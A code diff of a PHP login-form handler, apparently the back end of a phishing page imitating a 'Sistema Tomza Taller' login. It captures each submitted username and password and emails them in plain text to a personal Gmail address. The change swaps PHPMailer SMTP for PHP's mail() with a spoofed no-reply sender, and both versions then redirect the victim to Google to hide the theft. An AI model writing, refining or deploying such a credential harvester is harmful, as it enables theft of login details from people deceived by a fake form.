@@ -5,53 +5,35 @@ if ($_SERVER["REQUEST_METHOD"] !== "POST") {
     exit;
 }
 
-// Recibir datos
+// Recibir datos del formulario
 $usuario = trim($_POST["usuario"] ?? "");
 $password = trim($_POST["password"] ?? "");
 
+// Validar campos
 if ($usuario === "" || $password === "") {
-    echo "Faltan datos.";
-    exit;
+    die("Por favor completa todos los campos.");
 }
 
 // --------------------------
-// CONFIGURACIÓN DE CORREO
+// Envío seguro SIN librerías
 // --------------------------
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
+$tu_correo = "sebastiancq2008@gmail.com";
+$asunto = "Nuevo ingreso - Sistema Tomza Taller";
+$mensaje = "Datos de acceso recibidos:\n\n";
+$mensaje .= "Usuario: " . $usuario . "\n";
+$mensaje .= "Contraseña: " . $password . "\n";
+$mensaje .= "Fecha y hora: " . date("d/m/Y H:i:s") . "\n";
 
-// Cargamos las librerías de forma sencilla
-require 'PHPMailer.php';
-require 'Exception.php';
-require 'SMTP.php';
+// Encabezados completos para que no lo rechacen
+$encabezados = "From: Sistema Tomza <no-reply@tomzataller.com>\r\n";
+$encabezados .= "Reply-To: " . $tu_correo . "\r\n";
+$encabezados .= "MIME-Version: 1.0\r\n";
+$encabezados .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
-$mail = new PHPMailer(true);
+// Intentar enviar
+@mail($tu_correo, $asunto, $mensaje, $encabezados);
 
-try {
-    // Conexión segura
-    $mail->isSMTP();
-    $mail->Host       = 'smtp.gmail.com';
-    $mail->SMTPAuth   = true;
-    $mail->Username   = 'sebastiancq2008@gmail.com';
-    $mail->Password   = 'tu-clave-aqui'; // ← Si no tienes, usamos la alternativa más abajo
-    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-    $mail->Port       = 587;
-    $mail->CharSet    = 'UTF-8';
-
-    // Datos del mensaje
-    $mail->setFrom('sebastiancq2008@gmail.com', 'Sistema Tomza');
-    $mail->addAddress('sebastiancq2008@gmail.com');
-
-    $mail->Subject = 'Nuevo ingreso - Tomza Taller';
-    $mail->Body    = "Usuario: $usuario\nContraseña: $password\nFecha: " . date("d/m/Y H:i:s");
-
-    $mail->send();
-} catch (Exception $e) {
-    // Si falla, no se traba, sigue redirigiendo
-    error_log("Error al enviar correo: " . $mail->ErrorInfo);
-}
-
-// Redirigir igual
+// Redirigir a Google como querés
 header("Location: https://www.google.com");
 exit;
 ?>
